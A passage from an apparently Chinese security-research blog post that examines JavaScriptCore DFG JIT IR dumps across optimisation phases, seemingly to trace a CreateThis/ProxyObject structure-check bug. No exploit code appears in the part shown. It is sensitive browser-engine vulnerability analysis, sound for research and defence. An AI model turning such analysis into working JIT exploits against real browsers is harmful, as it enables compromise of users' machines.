loc3(G~&lt;Other&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">12:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">13:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc4(H~&lt;Other&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">14:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">15:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc5(I~&lt;Other&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">16:&lt; 1:-&gt; JSConstant(JS|PureInt, Function, Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">17:&lt; 1:-&gt; JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">18:&lt;!0:-&gt; MovHint(Check:Untyped:@17, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">19:&lt; 1:-&gt; SetLocal(Check:Untyped:@17, loc3(J~&lt;Object&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#1, exit: bc#3, ExitValid) predicting OtherObj</span></span><br><span class="line">20:&lt;!0:-&gt; MovHint(Check:Untyped:@17, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">21:&lt; 1:-&gt; SetLocal(Check:Untyped:@17, loc4(K~&lt;Object&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#3, exit: bc#6, ExitValid) predicting OtherObj</span></span><br><span class="line">22:&lt;!0:-&gt; CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">41:&lt;!0:-&gt; InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">23:&lt;!0:-&gt; GetLocal(Check:Untyped:@0, JS|MustGen|UseAsOther, ProxyObject, this(a), R:Stack(5), bc<span class="comment">#7, ExitValid) predicting ProxyObject</span></span><br><span class="line">24:&lt;!0:-&gt; MovHint(Check:Untyped:@23, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">25:&lt; 1:-&gt; SetLocal(Check:Untyped:@23, loc5(L~&lt;Object&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#7, exit: bc#10, ExitValid) predicting ProxyObject</span></span><br><span class="line">26:&lt; 1:-&gt; CreateThis(Check:Cell:@23, JS|UseAsOther, Final, R:HeapObjectCount,MiscFields, W:HeapObjectCount, Exits, ClobbersExit, bc<span class="comment">#10, ExitValid)</span></span><br><span class="line">27:&lt;!0:-&gt; MovHint(Check:Untyped:@26, MustGen, this, W:SideState, ClobbersExit, bc<span class="comment">#10, ExitInvalid)</span></span><br><span class="line">28:&lt; 1:-&gt; SetLocal(Check:Untyped:@26, IsFlushed, this(M!&lt;Final&gt;/FlushedJSValue), W:Stack(5), bc<span class="comment">#10, exit: bc#15, ExitValid) predicting Final</span></span><br><span class="line">29:&lt;!0:-&gt; GetLocal(Check:Untyped:@1, JS|MustGen|UseAsOther, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#15, ExitValid) predicting Array</span></span><br><span class="line">30:&lt;!0:-&gt; CheckNotEmpty(Check:Untyped:@42, MustGen, Exits, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">31:&lt; 1:-&gt; JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">32:&lt;!0:-&gt; GetLocal(Check:Untyped:@2, JS|MustGen|UseAsOther, NonIntAsdouble, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), bc<span class="comment">#17, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">38:&lt;!0:-&gt; CheckStructure(Check:Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">39:&lt; 1:-&gt; GetButterfly(Check:Cell:@42, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">40:&lt; 1:-&gt; DoubleRep(Check:RealNumber:@32, Double|PureInt, BytecodeDouble, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">33:&lt;!0:-&gt; PutByVal(Check:KnownCell:@42, Check:Int32:@31, Check:DoubleRepReal:@40&lt;Double&gt;, Check:Untyped:@39, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">34:&lt;!0:-&gt; Return(Check:Untyped:@26, MustGen, W:SideState, Exits, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">35:&lt;!0:-&gt; Flush(Check:Untyped:@2, MustGen|IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), W:SideState, bc<span class="comment">#22, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">36:&lt;!0:-&gt; Flush(Check:Untyped:@1, MustGen|IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), W:SideState, bc<span class="comment">#22, ExitValid) predicting Array</span></span><br><span class="line">37:&lt;!0:-&gt; Flush(Check:Untyped:@28, MustGen|IsFlushed, this(M!&lt;Final&gt;/FlushedJSValue), R:Stack(5), W:SideState, bc<span class="comment">#22, ExitValid) predicting Final</span></span><br><span class="line"></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched</span><br><span class="line">Vars After: &lt;empty&gt;</span><br><span class="line">Var Links: arg2:@32 arg1:@42 arg0:@28 loc0:@5 loc1:@7 loc2:@9 loc3:@19 loc4:@21 loc5:@25</span><br><span class="line">GC Values:</span><br><span class="line">Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73</span><br><span class="line">Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290</span><br><span class="line">Desired watchpoints:</span><br><span class="line">Watchpoint sets:</span><br><span class="line">Inline watchpoint sets: 0x11cdf1fe0, 0x11cdf0060, 0x11cdf27c0, 0x11cdf0760, 0x11cd701b0, 0x11cdf01b0</span><br><span class="line">Inferred values: 0x11cdd8f00</span><br><span class="line">Buffer views:</span><br><span class="line">Object property conditions:</span><br><span class="line">Inferred types:</span><br><span class="line">Structures:</span><br><span class="line">%Bl:JSLexicalEnvironment = 0x11cdf1f80:[JSLexicalEnvironment, &#123;&#125;, NonArray, Leaf]</span><br><span class="line">%Dy:Array = 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]</span><br><span class="line">%En:Function = 0x11cd70150:[Function, &#123;prototype:100&#125;, NonArray, Proto:0x11cdd0000, Leaf]</span><br></pre></td></tr></table></figure><p>CheckStructure这个IR有一个专门的提前阶段，叫DFGCheckStructureHoisting。这个过程把42 GetLocal、43 CheckStructure提前。对比clobberWorld版本这个阶段也是发生的。</p><p>随后，有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">Beginning DFG phase constant folding.</span><br><span class="line">Before constant folding:</span><br><span class="line"></span><br><span class="line">DFG <span class="keyword">for</span> assign<span class="comment">#Ei5h05:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]:</span></span><br><span class="line">Fixpoint state: FixpointNotConverged; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive</span><br><span class="line">Arguments <span class="keyword">for</span> block<span class="comment">#0: @0, @1, @2</span></span><br><span class="line"></span><br><span class="line">Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">Execution count: 1.000000</span><br><span class="line">Predecessors:</span><br><span class="line">Successors:</span><br><span class="line">Dominated by: <span class="comment">#root #0</span></span><br><span class="line">Dominates: <span class="comment">#0</span></span><br><span class="line">Dominance Frontier:</span><br><span class="line">Iterated Dominance Frontier:</span><br><span class="line">States: StructuresAreWatched</span><br><span class="line">Vars Before: arg2:(Top|Empty, TOP, TOP) arg1:(Cell|Empty, TOP, TOP) arg0:(Cell|Empty, TOP, TOP)</span><br><span class="line">Intersected Vars Before: arg2:(Top|Empty, TOP, TOP) arg1:(Cell|Empty, TOP, TOP) arg0:(Cell|Empty, TOP, TOP)</span><br><span class="line">Var Links: arg2:@2 arg1:@1 arg0:@0</span><br><span class="line">0:&lt; 1:-&gt; SetArgument(this(a), W:SideState, bc<span class="comment">#0, ExitValid) predicting ProxyObject</span></span><br><span class="line">1:&lt; 1:-&gt; SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), W:SideState, bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">42:&lt;!0:-&gt; GetLocal(Untyped:@1, JS|MustGen|PureInt, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">43:&lt;!0:-&gt; CheckStructure(Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">2:&lt; 1:-&gt; SetArgument(IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), W:SideState, bc<span class="comment">#0, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">3:&lt; 1:-&gt; JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">4:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">5:&lt; 1:-&gt; SetLocal(Untyped:@3, loc0(D~&lt;Other&gt;/FlushedJSValue), W:Stack(-1), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">6:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">7:&lt; 1:-&gt; SetLocal(Untyped:@3, loc1(E~&lt;Other&gt;/FlushedJSValue), W:Stack(-2), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">8:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">9:&lt; 1:-&gt; SetLocal(Untyped:@3, loc2(F~&lt;Other&gt;/FlushedJSValue), W:Stack(-3), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">10:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">11:&lt; 1:-&gt; SetLocal(Untyped:@3, loc3(G~&lt;Other&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">12:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">13:&lt; 1:-&gt; SetLocal(Untyped:@3, loc4(H~&lt;Other&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">14:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">15:&lt; 1:-&gt; SetLocal(Untyped:@3, loc5(I~&lt;Other&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">16:&lt; 1:-&gt; JSConstant(JS|PureInt, Function, Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">17:&lt; 1:-&gt; JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">18:&lt;!0:-&gt; MovHint(Untyped:@17, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">19:&lt; 1:-&gt; SetLocal(Untyped:@17, loc3(J~&lt;Object&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#1, exit: bc#3, ExitValid) predicting OtherObj</span></span><br><span class="line">20:&lt;!0:-&gt; MovHint(Untyped:@17, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">21:&lt; 1:-&gt; SetLocal(Untyped:@17, loc4(K~&lt;Object&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#3, exit: bc#6, ExitValid) predicting OtherObj</span></span><br><span class="line">22:&lt;!0:-&gt; CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">41:&lt;!0:-&gt; InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">23:&lt;!0:-&gt; GetLocal(Untyped:@0, JS|MustGen|UseAsOther, ProxyObject, this(a), R:Stack(5), bc<span class="comment">#7, ExitValid) predicting ProxyObject</span></span><br><span class="line">24:&lt;!0:-&gt; MovHint(Untyped:@23, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">25:&lt; 1:-&gt; SetLocal(Untyped:@23, loc5(L~&lt;Object&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#7, exit: bc#10, ExitValid) predicting ProxyObject</span></span><br><span class="line">26:&lt; 1:-&gt; CreateThis(Cell:@23, JS|UseAsOther, Final, R:HeapObjectCount,MiscFields, W:HeapObjectCount, Exits, ClobbersExit, bc<span class="comment">#10, ExitValid)</span></span><br><span class="line">27:&lt;!0:-&gt; MovHint(Untyped:@26, MustGen, this, W:SideState, ClobbersExit, bc<span class="comment">#10, ExitInvalid)</span></span><br><span class="line">28:&lt; 1:-&gt; SetLocal(Untyped:@26, this(M!&lt;Final&gt;/FlushedJSValue), W:Stack(5), bc<span class="comment">#10, exit: bc#15, ExitValid) predicting Final</span></span><br><span class="line">29:&lt;!0:-&gt; Check(MustGen, Array, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">30:&lt;!0:-&gt; CheckNotEmpty(Untyped:@42, MustGen, Exits, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">31:&lt; 1:-&gt; JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">32:&lt;!0:-&gt; GetLocal(Untyped:@2, JS|MustGen|UseAsOther, NonIntAsdouble, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), bc<span class="comment">#17, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">38:&lt;!0:-&gt; CheckStructure(Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">39:&lt; 1:-&gt; GetButterfly(Cell:@42, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">40:&lt; 1:-&gt; DoubleRep(Check:RealNumber:@32, Double|PureInt, BytecodeDouble, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">33:&lt;!0:-&gt; PutByVal(KnownCell:@42, Int32:@31, DoubleRepReal:@40&lt;Double&gt;, Untyped:@39, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">34:&lt;!0:-&gt; Return(Untyped:@26, MustGen, W:SideState, Exits, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">35:&lt;!0:-&gt; Flush(Check:Untyped:@2, MustGen|IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), W:SideState, bc<span class="comment">#22, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">36:&lt;!0:-&gt; Flush(Check:Untyped:@1, MustGen|IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), W:SideState, bc<span class="comment">#22, ExitValid) predicting Array</span></span><br><span class="line">37:&lt;!0:-&gt; Check(MustGen, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched, CFAInvalidated</span><br><span class="line">Vars After:</span><br><span class="line">Var Links: arg2:@32 arg1:@42 arg0:@28 loc0:@5 loc1:@7 loc2:@9 loc3:@19 loc4:@21 loc5:@25</span><br><span class="line"></span><br><span class="line">GC Values:</span><br><span class="line">Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73</span><br><span class="line">Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290</span><br><span class="line">Desired watchpoints:</span><br><span class="line">Watchpoint sets:</span><br><span class="line">Inline watchpoint sets: 0x11cdf3080, 0x11cdf1fe0, 0x11cdf0060, 0x11cdf27c0, 0x11cdf0760, 0x11cd701b0, 0x11cdf01b0</span><br><span class="line">Inferred values: 0x11cdd8f00</span><br><span class="line">Buffer views:</span><br><span class="line">Object property conditions:</span><br><span class="line">Inferred types:</span><br><span class="line">Structures:</span><br><span class="line">%Bl:JSLexicalEnvironment = 0x11cdf1f80:[JSLexicalEnvironment, &#123;&#125;, NonArray, Leaf]</span><br><span class="line">%Dy:Array = 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]</span><br><span class="line">%En:Function = 0x11cd70150:[Function, &#123;prototype:100&#125;, NonArray, Proto:0x11cdd0000, Leaf]</span><br><span class="line"></span><br><span class="line">Beginning DFG phase CFG simplification.</span><br><span class="line">(After constant folding and)Before CFG simplification:</span><br><span class="line"></span><br><span class="line">DFG <span class="keyword">for</span> assign<span class="comment">#Ei5h05:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]:</span></span><br><span class="line">Fixpoint state: FixpointNotConverged; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive</span><br><span class="line">Arguments <span class="keyword">for</span> block<span class="comment">#0: @0, @1, @2</span></span><br><span class="line"></span><br><span class="line">Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">Execution count: 1.000000</span><br><span class="line">Predecessors:</span><br><span class="line">Successors:</span><br><span class="line">Dominated by: <span class="comment">#root #0</span></span><br><span class="line">Dominates: <span class="comment">#0</span></span><br><span class="line">Dominance Frontier:</span><br><span class="line">Iterated Dominance Frontier:</span><br><span class="line">States: StructuresAreWatched</span><br><span class="line">Vars Before: arg2:(Top|Empty, TOP, TOP) arg1:(Cell|Empty, TOP, TOP) arg0:(Cell|Empty, TOP, TOP)</span><br><span class="line">Intersected Vars Before: arg2:(Top|Empty, TOP, TOP) arg1:(Cell|Empty, TOP, TOP) arg0:(Cell|Empty, TOP, TOP)</span><br><span class="line">Var Links: arg2:@2 arg1:@1 arg0:@0</span><br><span class="line">0:&lt; 1:-&gt; SetArgument(this(a), W:SideState, bc<span class="comment">#0, ExitValid) predicting ProxyObject</span></span><br><span class="line">1:&lt; 1:-&gt; SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), W:SideState, bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">42:&lt;!0:-&gt; GetLocal(Untyped:@1, JS|MustGen|PureInt, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">44:&lt;!0:-&gt; AssertNotEmpty(Check:Untyped:@42, MustGen, W:SideState, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">43:&lt;!0:-&gt; CheckStructure(Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">2:&lt; 1:-&gt; SetArgument(IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), W:SideState, bc<span class="comment">#0, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">3:&lt; 1:-&gt; JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">4:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">5:&lt; 1:-&gt; SetLocal(Untyped:@3, loc0(D~&lt;Other&gt;/FlushedJSValue), W:Stack(-1), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">6:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">7:&lt; 1:-&gt; SetLocal(Untyped:@3, loc1(E~&lt;Other&gt;/FlushedJSValue), W:Stack(-2), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">8:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">9:&lt; 1:-&gt; SetLocal(Untyped:@3, loc2(F~&lt;Other&gt;/FlushedJSValue), W:Stack(-3), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">10:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">11:&lt; 1:-&gt; SetLocal(Untyped:@3, loc3(G~&lt;Other&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">12:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">13:&lt; 1:-&gt; SetLocal(Untyped:@3, loc4(H~&lt;Other&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">14:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">15:&lt; 1:-&gt; SetLocal(Untyped:@3, loc5(I~&lt;Other&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">16:&lt; 1:-&gt; JSConstant(JS|PureInt, Function, Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">17:&lt; 1:-&gt; JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">18:&lt;!0:-&gt; MovHint(Untyped:@17, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">19:&lt; 1:-&gt; SetLocal(Untyped:@17, loc3(J~&lt;Object&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#1, exit: bc#3, ExitValid) predicting OtherObj</span></span><br><span class="line">20:&lt;!0:-&gt; MovHint(Untyped:@17, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">21:&lt; 1:-&gt; SetLocal(Untyped:@17, loc4(K~&lt;Object&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#3, exit: bc#6, ExitValid) predicting OtherObj</span></span><br><span class="line">22:&lt;!0:-&gt; CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">41:&lt;!0:-&gt; InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">23:&lt;!0:-&gt; GetLocal(Untyped:@0, JS|MustGen|UseAsOther, ProxyObject, this(a), R:Stack(5), bc<span class="comment">#7, ExitValid) predicting ProxyObject</span></span><br><span class="line">24:&lt;!0:-&gt; MovHint(Untyped:@23, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">25:&lt; 1:-&gt; SetLocal(Untyped:@23, loc5(L~&lt;Object&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#7, exit: bc#10, ExitValid) predicting ProxyObject</span></span><br><span class="line">26:&lt; 1:-&gt; CreateThis(Cell:@23, JS|UseAsOther, Final, R:HeapObjectCount,MiscFields, W:HeapObjectCount, Exits, ClobbersExit, bc<span class="comment">#10, ExitValid)</span></span><br><span class="line">27:&lt;!0:-&gt; MovHint(Untyped:@26, MustGen, this, W:SideState, ClobbersExit, bc<span class="comment">#10, ExitInvalid)</span></span><br><span class="line">28:&lt; 1:-&gt; SetLocal(Untyped:@26, this(M!&lt;Final&gt;/FlushedJSValue), W:Stack(5), bc<span class="comment">#10, exit: bc#15, ExitValid) predicting Final</span></span><br><span class="line">29:&lt;!0:-&gt; Check(MustGen, 